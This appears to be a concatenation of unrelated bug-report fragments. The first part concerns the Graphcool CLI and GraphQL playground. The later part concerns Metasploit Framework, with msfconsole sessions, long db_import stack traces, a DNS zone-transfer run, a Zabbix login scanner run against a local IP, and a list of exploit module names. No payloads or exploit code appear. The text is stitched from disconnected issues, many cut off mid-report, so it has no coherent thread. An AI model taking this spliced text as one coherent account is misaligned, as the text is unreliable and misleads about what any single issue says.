and this works (only pass `tagsids`): ```
const updatepostquery = ({ id, createdbyid, timestamp, description, tagsids,
}) => ({ mutation: gql` mutation updatepost( $id: id! $createdbyid: id! $timestamp: datetime! $description: string $tagsids: [id!] ) { updatepost( id: $id createdbyid: $createdbyid timestamp: $timestamp description: $description tagsids: $tagsids ) { id timestamp description tags { id tag } createdby { id username } } } `, variables: { id, createdbyid, timestamp, description, tagsids, },
``` *however*, if i pass both parameters, only the new `tag`s will be created an associated (`tags`) - the other existing `tag` ids i pass (`tagsids`) are _not_ associated: ```
const updatepostquery = ({ id, createdbyid, timestamp, description, tags, tagsids,
}) => ({ mutation: gql` mutation updatepost( $id: id! $createdbyid: id! $timestamp: datetime! $description: string $tags: [posttagstag!] $tagsids: [id!] ) { updatepost( id: $id createdbyid: $createdbyid timestamp: $timestamp description: $description tags: $tags tagsids: $tagsids ) { id timestamp description tags { id tag } createdby { id username } } } `, variables: { id, createdbyid, timestamp, description, tags, tagsids, },
trying to deploy to the default target triggers errors when `${opt:target}` is used in **graphcool.yml** running `graphcool deploy` fails with errors like: `a valid option to satisfy the declaration 'opt:target' could not be found.` the workaround for now is to explicitly set the target: `graphcool deploy --target dev`
if you add a template using `graphcool add-template`, devdependencies are ignored
however, these devdependencies might be needed to build the functions
for example, when using typescript, the `@types/...` dependencies are devdependencies
because they are not merged, the function build throws warnings/errors
also, the merging is very rudimentary at the moment
the library semver-intersection or similar can be used to make the merging more intelligent.
if i have a local target in my `.graphcoolrc` file, all commands always warns that it cannot find that target when my ~/.graphcoolrc is incorrect, even if i specify another target, or have a shared cluster target as default.
![image](
deploying to a graphcool target works without a `.graphcoolrc` file by setting the environment variable: ```
export graphcool_target=local/cj9evgxgm00040174yoi292dw
graphcool deploy
``` however, this is not the case for the following commands which also support a target parameter: * `graphcool playground`
* `graphcool info`
* `graphcool root-token`
* `graphcool logs`
* `graphcool delete`
* `graphcool invoke-local`
`graphcool local pull` is the command to get the lastest version of the docker images
however, running `graphcool local up` also updates the docker images, without asking.
the function context for a local cluster specifies the subscription endpoint as ` ` instead of `ws://`, for example:
`"subscriptions": " "`
deploying an invalid service definition for the first time creates a new service.
i getting `you can only create scalar fields and '<fieldname>' is not a scalar value
did you intend to create a relation?` when i creating relations
specifically it happens when i setting a relation like this: ```
type firsttype { seconds: secondtype @relation(name: "typerelation")
} type secondtype { firsts: [firsttype!]! @relation(name: "typerelation")
clicking any link to another docs page in a quickstart renders a white background
when you deploy to a local cluster with a different ip/hostname (blocked by #1091), the subscription endpoint shown is wrong:
``` simple api: relay api: subscriptions api: ws://localhost:60000/subscriptions/v1/cj9fqdxy2001s01503bxi8duy
- execute `graphcool local up` || `sudo graphcool local up`
- exits with code 1 showing docker-compose help screen
unable to query `allbreeds` in "rest-wrapper" example project using `graphcool/0.8.5 (darwin-x64) node-v8.6.0`.
i have set up a service, running locally, and i want to access the logs
when i run `gc logs`, i need to authenticate online, which is totally unnecessary.
`cannot read property 'subscribe' of undefined` throw after hit play button
![image](
for queries, mutations, and subscriptions, the code generation for browser/graphql-request always leaves out the request type.
when you have this query:
query { allusers{ id }
the generate code dialog says: "generate code for your query" after prettify:
{ allusers{ id }
it says: "generate code for your mutation"
it doesn't do anything.
also, be aware that if you decide to fix this, it has become even easier to share a master roottoken, because it is added by default when selecting 'admin'!
![image](
while on a permission tab, i would expect the schema to show the permission endpoint schema.
![image]( ![image](
when you open a new permission tab, the query doesn't show up, and you can't type anything, until you refresh the page.
![image]( also, closing the permissions tab breaks the layout.
![image](
graphcool delete
? are you sure that you want to delete cj943qp0l000601098v37d5do? y/n y
deleting project cj943qp0l000601098v37d5do..
! error: cannot query field 'deleteproject' on type 'mutation'
did you mean \'addproject\'? (line 3, column 7): cj943qp0l000601098v37d5do: deleteproject(input:{ ^ { "data": null, "errors": [ { "message": "cannot query field \'deleteproject\' on type \'mutation\'
did you mean \'addproject\'? (line 3, column 7):\ cj943qp0l000601098v37d5do: deleteproject(input:{\ ^", "locations": [ { "line": 3, "column": 7 } ] } ], "status": 400
`graphcool deploy `
select local: docker
throws error `econnrefused 127.0.0.1:60000`
and `econnrefused `
i forgot to set an environment variable
on deploy, the cli gets into an endless loop that i forcefully had to kill
![image](
i deploy to a second local cluster, using `gc deploy -c test2 -t bla` and get an error showing the wrong faas port
![image]( ![image]( `graphcool local ps -n test2` shows that everything is up, and that faas is on 60051.
cluster configuration in ~/.graphcoolrc also defines 60051
i also noticed that the db and mq machines use the same port on all clusters
does that work well together?
i can't select a second local cluster with `graphcool deploy`
a create mutation with a field called `input` returns internal server error: ```graphql
mutation { createcar(input: 42)
``` this will fail with internal server error
gives an error and fails
it fails while recompiling the apk file
sea some amount of encoded data like $u$ something
if use it in cd command instead of real name all works.
it crashes.
error: no such file or directory @ rb_sysopen - /tmp/d20201017-4259-1x21kwh/aligned.apk
module cannot reliably check exploitability, because it fails at the step which checks if the site is running wordpress
![image](
only the time shows up.
some runaway jobs keep running.
the error message listed above
`shell` doesn't show command output
it tells me -u has not being specified
i tried to change parameter position or to add an option "a" but these didn\'t work
the code in github seems correct.
screen goes blank after login
the disclosure date for this module is 0020-06-20.
i'm guessing that the ns returned by the soa request is chosen rather than the ns specified in the options, or it may just pick the first ns entry from doing an ns lookup
as the ns doesn't resolve, the axfr fails with an error
msf6 auxiliary(gather/enum_dns) > run [*] querying dns ns records for mytest.com
[+] witrap.com ns: ns1.mytest.com
[+] witrap.com ns: ns1.mytest.com
[+] witrap.com ns: ns3.mytest.com
[*] attempting dns axfr for mytest.com from ns1.mytest.com
[-] axfr failed: getaddrinfo: name or service not known
[*] auxiliary module execution completed
msf6 > db_import ../qa/import_files/core2.xml
[*] importing 'ci' data
[*] import: parsing with 'nokogiri v1.10.10'
[*] importing host 192.168.1.105
[-] error while running command db_import: pg::invalidtextrepresentation: error: invalid input syntax for type inet: "49"
: select "services".* from "services" inner join "hosts" on "services"."host_id" = "hosts"."id" where "hosts"."workspace_id" = $1 and "hosts"."address" = $2 and "services"."proto" = $3 and "services"."port" = $4 order by services.port, services.proto, "hosts"."address", "services"."port" asc limit $5 call stack:
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql_adapter.rb:611:in `exec_params'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql_adapter.rb:611:in `block (2 levels) in exec_no_cache'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activesupport-5.2.4.4/lib/active_support/dependencies/interlock.rb:48:in `block in permit_concurrent_loads'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activesupport-5.2.4.4/lib/active_support/concurrency/share_lock.rb:187:in `yield_shares'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activesupport-5.2.4.4/lib/active_support/dependencies/interlock.rb:47:in `permit_concurrent_loads'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql_adapter.rb:610:in `block in exec_no_cache'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract_adapter.rb:581:in `block (2 levels) in log'
/usr/share/rvm/rubies/ruby-2.6.6/lib/ruby/2.6.0/monitor.rb:235:in `mon_synchronize'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract_adapter.rb:580:in `block in log'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activesupport-5.2.4.4/lib/active_support/notifications/instrumenter.rb:23:in `instrument'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract_adapter.rb:571:in `log'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql_adapter.rb:609:in `exec_no_cache'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql_adapter.rb:598:in `execute_and_clear'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/postgresql/database_statements.rb:81:in `exec_query'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/database_statements.rb:478:in `select'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/database_statements.rb:70:in `select_all'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/query_cache.rb:106:in `select_all'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/querying.rb:41:in `find_by_sql'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:560:in `block in exec_queries'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:584:in `skip_query_cache_if_necessary'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:547:in `exec_queries'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/association_relation.rb:34:in `exec_queries'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:422:in `load'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:200:in `records'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation.rb:195:in `to_ary'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation/finder_methods.rb:532:in `find_nth_with_limit'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation/finder_methods.rb:517:in `find_nth'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/relation/finder_methods.rb:125:in `first'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/note.rb:140:in `block in report_note'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/connection_pool.rb:416:in `with_connection'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/note.rb:81:in `report_note'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/note_data_proxy.rb:40:in `block in report_note'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/note_data_proxy.rb:38:in `report_note'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/nokogiri_doc_mixin.rb:152:in `db_report'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:158:in `block (2 levels) in report_services'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:156:in `each_pair'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:156:in `block in report_services'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:155:in `each_pair'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:155:in `report_services'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/ci_nokogiri.rb:53:in `end_element'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/document.rb:127:in `end_element_namespace'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in `parse_with'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in `parse_memory'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:83:in `parse'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import/ci.rb:11:in `import_ci_noko_stream'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import/ci.rb:24:in `import_ci_xml'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import.rb:100:in `import'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import.rb:219:in `import_file'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:17:in `block in import_file'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:15:in `import_file'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1464:in `block (3 levels) in cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `each'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `block (2 levels) in cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `each'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `block in cmd_db_import'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/connection_pool.rb:416:in `with_connection'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1446:in `cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:23:in `<main>'
``` and also: ```
msf6 > workspace -a appscan
[*] added workspace: appscan
[*] workspace: appscan
msf6 > db_import ../qa/import_files/appscan.xml
[*] importing 'appscan' data
[*] import: parsing with 'nokogiri v1.10.10'
[*] importing host 65.61.137.117
[-] error while running command db_import: validation failed: proof can't be blank call stack:
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/validations.rb:80:in `raise_validation_error'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/validations.rb:52:in `save!'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/transactions.rb:315:in `block in save!'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/transactions.rb:387:in `block in with_transaction_returning_status'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/database_statements.rb:267:in `block in transaction'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/transaction.rb:239:in `block in within_new_transaction'
/usr/share/rvm/rubies/ruby-2.6.6/lib/ruby/2.6.0/monitor.rb:235:in `mon_synchronize'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/transaction.rb:236:in `within_new_transaction'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/database_statements.rb:267:in `transaction'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/transactions.rb:212:in `transaction'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/transactions.rb:385:in `with_transaction_returning_status'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/transactions.rb:315:in `save!'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/suppressor.rb:48:in `save!'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/web.rb:366:in `block in report_web_vuln'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/connection_pool.rb:416:in `with_connection'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/web.rb:291:in `report_web_vuln'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:35:in `block in report_web_vuln'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:34:in `report_web_vuln'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/nokogiri_doc_mixin.rb:152:in `db_report'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/appscan_nokogiri.rb:96:in `report_web_vuln'
/home/gwillcox/git/metasploit-framework/lib/rex/parser/appscan_nokogiri.rb:68:in `end_element'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/document.rb:127:in `end_element_namespace'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in `parse_with'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in `parse_memory'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:83:in `parse'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import/appscan.rb:11:in `import_appscan_noko_stream'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import/appscan.rb:24:in `import_appscan_xml'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import.rb:100:in `import'
/home/gwillcox/git/metasploit-framework/lib/msf/core/db_manager/import.rb:219:in `import_file'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:17:in `block in import_file'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:15:in `import_file'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1464:in `block (3 levels) in cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `each'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `block (2 levels) in cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `each'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `block in cmd_db_import'
/home/gwillcox/.rvm/gems/ruby-2.6.6@metasploit-framework/gems/activerecord-5.2.4.4/lib/active_record/connection_adapters/abstract/connection_pool.rb:416:in `with_connection'
/home/gwillcox/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1446:in `cmd_db_import'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/home/gwillcox/git/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/gwillcox/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:23:in `<main>'
ran zabbix_login module from metasploit, with following result:
msf auxiliary(scanner/http/zabbix_login) > set rhosts 192.168.0.151
rhosts => 192.168.0.151
msf5 auxiliary(scanner/http/zabbix_login) > run [*] 192.168.0.151:80 - unexpected http body (is this really zabbix?)
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed i downloaded version 3, 4 and 5 of zabbix and confirmed the above happens in all 3 cases
appliance zabbix server version 3 - os is ubuntu 16.04
appliance zabbix server version 4 - os is centos 8
appliance zabbix server version 5 - os is centos 8
the console shows that chinese has been deleted, but it has not been completely deleted
i want to type in the console`test `, i want to delete it` `.
back four times and the ` ` will be deleted in the console display, but the actual ` ` is not deleted
need to `back` six times to completely delete
but "test " in the console will change to "te".
but in fact the command received by the console is still `test`, but the display becomes `te`.
`msf5 > db_import rr.xml`
`[*] importing 'openvas xml' data`
`[*] import: parsing with 'nokogiri v1.10.10'`
`[-] **error while running command db_import: validation failed: port must be an integer**` call stack:
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/validations.rb:79:in raise_record_invalid'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/validations.rb:43:in `save!'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/attribute_methods/dirty.rb:29:in `save!'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/transactions.rb:291:in `block in save!'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/transactions.rb:351:in `block in with_transaction_returning_status'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract/database_statements.rb:213:in `block in transaction'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract/transaction.rb:184:in `within_new_transaction'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract/database_statements.rb:213:in `transaction'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/transactions.rb:220:in `transaction'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/transactions.rb:348:in `with_transaction_returning_status'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/transactions.rb:291:in `save!'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/service.rb:132:in `block in report_service'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord`-4.2.11.3/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in with_connection'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/service.rb:61:in `report_service'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/service_data_proxy.rb:38:in `block in report_service'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/service_data_proxy.rb:36:in `report_service'
`/usr/share/metasploit-framework/lib/rex/parser/nokogiri_doc_mixin.rb:152:in `db_report'
`/usr/share/metasploit-framework/lib/rex/parser/openvas_nokogiri.rb:179:in `record_service'
`/usr/share/metasploit-framework/lib/rex/parser/openvas_nokogiri.rb:117:in `end_element'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/document.rb:127:in end_element_namespace'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in parse_with'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:110:in parse_memory'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nokogiri-1.10.10/lib/nokogiri/xml/sax/parser.rb:83:in parse'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/import/open_vas.rb:11:in `import_openvas_noko_stream'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/import/open_vas.rb:22:in `import_openvas_new_xml'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/import.rb:100:in `import'
`/usr/share/metasploit-framework/lib/msf/core/db_manager/import.rb:219:in `import_file'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:17:in `block in import_file'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
`/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:15:in `import_file'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1464:in `block (3 levels) in cmd_db_import'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `each'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1457:in `block (2 levels) in cmd_db_import'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `each'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1451:in `block in cmd_db_import'
`/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
`/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:1446:in `cmd_db_import'
`/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
`/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
`/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
`/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
`/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
`/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
`/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
`/usr/bin/msfconsole:23:in `<main>'
all exploits listed show "manual" in the rank column.
``` name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 aix/local/ibstat_path 2013-09-24 **manual** yes ibstat $path privilege escalation 1 aix/local/xorg_x11_server 2018-10-25 **manual** yes xorg x11 server local privilege escalation 2 aix/rpc_cmsd_opcode21 2009-10-07 **manual** no aix calendar manager service daemon (rpc.cmsd) opcode 21 buffer overflow 3 aix/rpc_ttdbserverd_realpath 2009-06-17 **manual** no tooltalk rpc.ttdbserverd _tt_internal_realpath buffer overflow (aix) 4 android/adb/adb_server_exec 2016-01-01 **manual** yes android adb debug server remote payload execution 5 android/browser/samsung_knox_smdm_url 2014-11-12 **manual** no samsung galaxy knox android browser rce 6 android/browser/stagefright_mp4_tx3g_64bit 2015-08-13 **manual** no android stagefright mp4 tx3g integer overflow
error occurred when web_service connect db
`~/.msf4/payloads.json` is not created
if it exists (empty file), it is not fed with new information.
[-] error while running command wmap_sites: 784: unexpected token at '<h1>internal server error</h1>'
call stack:
/opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/json-2.3.1/lib/json/common.rb:263:in `parse'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/json-2.3.1/lib/json/common.rb:263:in `parse'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/remote/http/response_data_helper.rb:45:in `json_to_mdm_object'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/remote/http/remote_host_data_service.rb:13:in `hosts'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/proxy/host_data_proxy.rb:10:in `block in hosts'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/proxy/host_data_proxy.rb:5:in `hosts'
/opt/metasploit-framework/embedded/framework/plugins/wmap.rb:1286:in `view_sites'
